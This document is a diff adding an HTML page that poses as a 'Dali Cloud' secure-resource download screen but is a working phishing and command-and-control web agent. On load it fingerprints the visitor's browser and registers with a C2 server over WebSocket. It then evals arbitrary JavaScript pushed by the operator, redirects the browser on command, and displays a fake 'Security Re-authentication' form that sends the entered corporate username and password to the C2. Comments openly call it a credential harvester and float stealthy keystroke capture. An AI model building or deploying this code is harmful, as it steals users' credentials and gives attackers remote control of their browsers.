@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Secure Resource Access // Dali Cloud</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&family=JetBrains+Mono:wght@400&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --bg: #030712;
+        --accent: #38bdf8;
+        --glass: rgba(255, 255, 255, 0.03);
+        --border: rgba(255, 255, 255, 0.08);
+        --text: #f3f4f6;
+        --text-muted: #9ca3af;
+      }
+
+      body {
+        margin: 0;
+        padding: 0;
+        background: var(--bg);
+        color: var(--text);
+        font-family: "Outfit", sans-serif;
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+      }
+
+      /* Abstract Background */
+      .bg-glow {
+        position: absolute;
+        width: 600px;
+        height: 600px;
+        background: radial-gradient(
+          circle,
+          rgba(56, 189, 248, 0.05) 0%,
+          transparent 70%
+        );
+        z-index: -1;
+        filter: blur(80px);
+      }
+
+      .container {
+        max-width: 500px;
+        width: 90%;
+        padding: 3rem;
+        background: var(--glass);
+        border: 1px solid var(--border);
+        border-radius: 2rem;
+        backdrop-filter: blur(20px);
+        text-align: center;
+        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        animation: fadeIn 0.8s ease-out;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .loader {
+        width: 48px;
+        height: 48px;
+        border: 3px solid var(--accent);
+        border-bottom-color: transparent;
+        border-radius: 50%;
+        display: inline-block;
+        box-sizing: border-box;
+        animation: rotation 1s linear infinite;
+        margin-bottom: 2rem;
+      }
+
+      @keyframes rotation {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      h1 {
+        font-size: 1.8rem;
+        font-weight: 600;
+        margin-bottom: 1rem;
+        letter-spacing: -0.02em;
+      }
+
+      p {
+        color: var(--text-muted);
+        font-size: 1rem;
+        line-height: 1.6;
+        margin-bottom: 2rem;
+      }
+
+      .status-box {
+        background: rgba(0, 0, 0, 0.2);
+        padding: 1rem;
+        border-radius: 1rem;
+        border: 1px solid var(--border);
+        font-family: "JetBrains Mono", monospace;
+        font-size: 0.8rem;
+        color: var(--accent);
+        text-align: left;
+        margin-bottom: 1.5rem;
+      }
+
+      .status-line {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 5px;
+      }
+
+      .status-line span:first-child {
+        color: var(--text-muted);
+      }
+
+      .btn-fake {
+        display: inline-block;
+        padding: 1rem 2.5rem;
+        background: var(--accent);
+        color: #000;
+        font-weight: 600;
+        border-radius: 1rem;
+        text-decoration: none;
+        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        opacity: 0.5;
+        cursor: not-allowed;
+      }
+
+      /* Phish UI (Hidden initially) */
+      #phish-form {
+        display: none;
+        text-align: left;
+      }
+
+      .form-group {
+        margin-bottom: 1.5rem;
+      }
+
+      label {
+        display: block;
+        margin-bottom: 0.5rem;
+        font-size: 0.9rem;
+        color: var(--text-muted);
+      }
+
+      input {
+        width: 100%;
+        padding: 1rem;
+        background: rgba(255, 255, 255, 0.05);
+        border: 1px solid var(--border);
+        border-radius: 1rem;
+        color: #fff;
+        outline: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="bg-glow" style="top: -10%; left: -10%"></div>
+    <div class="bg-glow" style="bottom: -10%; right: -10%"></div>
+
+    <div class="container" id="main-container">
+      <div id="loading-view">
+        <span class="loader"></span>
+        <h1>Verifying Identity...</h1>
+        <p>
+          We're establishing a secure end-to-end encrypted connection to fetch
+          your requested resource.
+        </p>
+
+        <div class="status-box">
+          <div class="status-line">
+            <span>[STATUS]</span> Establishing WebSocket...
+          </div>
+          <div class="status-line" id="status-reg">
+            <span>[STATUS]</span> Awaiting registration...
+          </div>
+          <div id="status-extra"></div>
+        </div>
+
+        <a href="#" class="btn-fake" id="action-btn">Download Resource</a>
+      </div>
+
+      <!-- This is a generic Credential Harvester that can be triggered by C2 -->
+      <div id="phish-form">
+        <div style="text-align: center; margin-bottom: 2rem">
+          <svg
+            width="48"
+            height="48"
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="var(--accent)"
+            stroke-width="2"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            style="margin-bottom: 1rem"
+          >
+            <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
+            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+          </svg>
+          <h2>Security Re-authentication</h2>
+          <p style="font-size: 0.9rem">
+            Your session has expired. Please re-authenticate to view the
+            encrypted container.
+          </p>
+        </div>
+        <div class="form-group">
+          <label>Corporate Email / Username</label>
+          <input type="text" id="phish-user" placeholder="user@company.com" />
+        </div>
+        <div class="form-group">
+          <label>Security Password</label>
+          <input type="password" id="phish-pass" placeholder="••••••••" />
+        </div>
+        <button
+          class="btn-fake"
+          style="width: 100%; opacity: 1; cursor: pointer"
+          onclick="submitCredentials()"
+        >
+          Continue to Resource
+        </button>
+      </div>
+    </div>
+
+    <script>
+      // --- PHANTOM WEB AGENT LOGIC ---
+      let socket;
+      let agentId =
+        localStorage.getItem("dali_web_id") ||
+        "web_" + Math.random().toString(36).substr(2, 9);
+      localStorage.setItem("dali_web_id", agentId);
+
+      function initAgent() {
+        const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
+        const wsUrl = `${protocol}//${window.location.host}/ws`;
+
+        socket = new WebSocket(wsUrl);
+
+        socket.onopen = () => {
+          console.log("[Dali] Connected to C2");
+          // Register as Web Agent
+          register();
+        };
+
+        socket.onmessage = (event) => {
+          const data = JSON.parse(event.data);
+          handleTask(data);
+        };
+
+        socket.onclose = () => {
+          setTimeout(initAgent, 5000); // Auto-reconnect
+        };
+      }
+
+      async function register() {
+        const info = {
+          os: navigator.platform,
+          browser: navigator.userAgent,
+          language: navigator.language,
+          screen: `${window.screen.width}x${window.screen.height}`,
+          url: window.location.href,
+          time: new Date().toISOString(),
+        };
+
+        // Attempt to get IP/Location if needed, but for now just UA
+        socket.send(
+          JSON.stringify({
+            event: "register",
+            agent_id: agentId,
+            agent_type: "web",
+            info: info,
+            version: "Web-1.0.0",
+          })
+        );
+
+        document.getElementById(
+          "status-reg"
+        ).innerHTML = `<span>[STATUS]</span> Registered as ${agentId}`;
+      }
+
+      function handleTask(task) {
+        // Check if task is for us
+        if (task.agent_id && task.agent_id !== agentId) return;
+        if (!task.type) return; // Not a task push
+
+        console.log(`[*] Processing task: ${task.type} (${task.id})`);
+
+        // Handle pushed tasks (if any)
+        if (task.type === "shell") {
+          // Browser can't run shell, but let's implement JS eval
+          try {
+            const result = eval(task.payload.command);
+            sendResult(task.id, { status: "success", output: String(result) });
+          } catch (e) {
+            sendResult(task.id, { status: "error", output: e.message });
+          }
+        } else if (task.type === "prompt") {
+          // Trigger the phish form
+          showPhishUI(task.id);
+        } else if (task.type === "redirect") {
+          window.location.href = task.payload.url;
+        } else if (task.type === "alert") {
+          alert(task.payload.message);
+          sendResult(task.id, { status: "success" });
+        }
+      }
+
+      function sendResult(taskId, result) {
+        socket.send(
+          JSON.stringify({
+            event: "task_result",
+            agent_id: agentId,
+            task_id: taskId,
+            result: result,
+          })
+        );
+      }
+
+      // --- DECEPTION LOGIC ---
+      let currentPhishTaskId = null;
+
+      function showPhishUI(taskId) {
+        currentPhishTaskId = taskId;
+        document.getElementById("loading-view").style.display = "none";
+        document.getElementById("phish-form").style.display = "block";
+      }
+
+      function submitCredentials() {
+        const user = document.getElementById("phish-user").value;
+        const pass = document.getElementById("phish-pass").value;
+
+        if (user && pass) {
+          sendResult(currentPhishTaskId, {
+            status: "success",
+            data: { username: user, password: pass },
+            type: "credentials",
+          });
+
+          // Show success and redirect back to "loading"
+          document.getElementById("phish-form").innerHTML =
+            '<div style="text-align:center"><span class="loader"></span><p>Authentication complete. Decrypting...</p></div>';
+          setTimeout(() => {
+            location.reload();
+          }, 2000);
+        }
+      }
+
+      // --- BACKGROUND MONITORING (Passive Info) ---
+      // Capture keystrokes, perhaps? (Stealthy)
+      // For now, just stay online.
+
+      initAgent();
+    </script>
+  </body>
+</html>
